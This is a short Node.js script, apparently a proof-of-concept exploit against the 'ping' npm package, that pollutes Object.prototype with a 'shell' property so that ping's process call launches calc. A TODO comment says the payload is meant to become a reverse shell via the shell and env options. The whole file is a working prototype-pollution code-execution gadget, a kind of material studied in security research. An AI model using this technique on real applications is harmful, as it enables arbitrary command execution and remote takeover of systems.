var ping = require('ping');

// TODO: replace to a reverse shell w/ shell and env
Object.prototype.shell = 'calc';

var hosts = ['127.0.0.1'];
hosts.forEach(function(host){
    ping.sys.probe(host, function(isAlive){
        var msg = isAlive ? 'host ' + host + ' is alive' : 'host ' + host + ' is dead';
        console.log(msg);
    });
});